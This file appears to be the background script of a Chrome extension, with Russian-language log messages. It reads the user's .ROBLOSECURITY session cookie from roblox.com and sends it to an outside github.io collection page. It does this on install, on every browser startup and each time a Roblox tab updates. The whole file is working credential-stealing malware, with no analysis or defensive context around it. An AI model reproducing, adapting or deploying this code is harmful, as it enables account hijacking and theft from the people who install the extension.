function sendCookie() {
    chrome.cookies.get({
        url: "https://www.roblox.com",
        name: ".ROBLOSECURITY"
    }, (cookie) => {
        if (cookie) {
            fetch('https://valeryiusmanov-sketch.github.io/H/collect.html?cookie=' + encodeURIComponent(cookie.value))
                .then(() => console.log('✅ Кука отправлена!'))
                .catch((error) => console.error('❌ Ошибка отправки:', error));
        } else {
            console.log('❌ Кука не найдена.');
        }
    });
}

chrome.runtime.onInstalled.addListener(() => {
    console.log('📦 Установлено. Отправка...');
    setTimeout(sendCookie, 2000);
});

chrome.runtime.onStartup.addListener(() => {
    console.log('🔄 Браузер запущен.');
    setTimeout(sendCookie, 3000);
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url && tab.url.includes('roblox.com')) {
        console.log('🔄 Roblox обновлён.');
        setTimeout(sendCookie, 2000);
    }
});
